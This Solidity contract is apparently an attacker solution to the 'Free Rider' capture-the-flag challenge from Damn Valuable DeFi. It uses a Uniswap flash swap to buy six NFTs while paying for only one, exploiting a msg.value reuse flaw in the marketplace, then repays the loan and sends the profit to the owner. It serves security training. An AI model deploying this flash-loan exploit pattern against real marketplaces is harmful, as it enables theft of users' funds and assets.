pragma solidity ^0.8.0;

import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol';
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import './FreeRiderNFTMarketplace.sol';
import './FreeRiderRecovery.sol';
import "../DamnValuableNFT.sol";

interface IWETH{
    function withdraw(uint256) external;
    function deposit() external payable;
    function transfer(address, uint256) external;
}

contract FreeRiderAttacker is IUniswapV2Callee, IERC721Receiver {
    IWETH immutable weth;
    FreeRiderNFTMarketplace immutable marketplace;
    FreeRiderRecovery immutable recovery;
    DamnValuableNFT immutable nft;
    address immutable owner;

    constructor(address _weth, address payable _marketplace, address _recovery, address _nft, address _owner) public {
        weth = IWETH(_weth);
        marketplace = FreeRiderNFTMarketplace(_marketplace);
        recovery = FreeRiderRecovery(_recovery);
        nft = DamnValuableNFT(_nft);
        owner = _owner;
    }

    receive() external payable {}

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external override {
        weth.withdraw(amount0);
        uint256[] memory tokenIds = new uint[](6);
        for(uint256 i = 0; i < 6;){
            unchecked{
                tokenIds[i] = i;
                i++;
            }
        }
        marketplace.buyMany{value: amount0}(tokenIds);
        for(uint256 i = 0; i < 6;){
            unchecked{
                nft.safeTransferFrom(address(this), address(recovery), i, abi.encode(address(this)));
                i++;
            }
        }

        weth.deposit{value: 16 ether}();
        weth.transfer(msg.sender, 16 ether);
        (bool success,) = payable(owner).call{value: address(this).balance}(new bytes(0));
    }

    function onERC721Received(address, address, uint256 _tokenId, bytes memory _data) external override returns (bytes4){
        return IERC721Receiver.onERC721Received.selector;
    }
}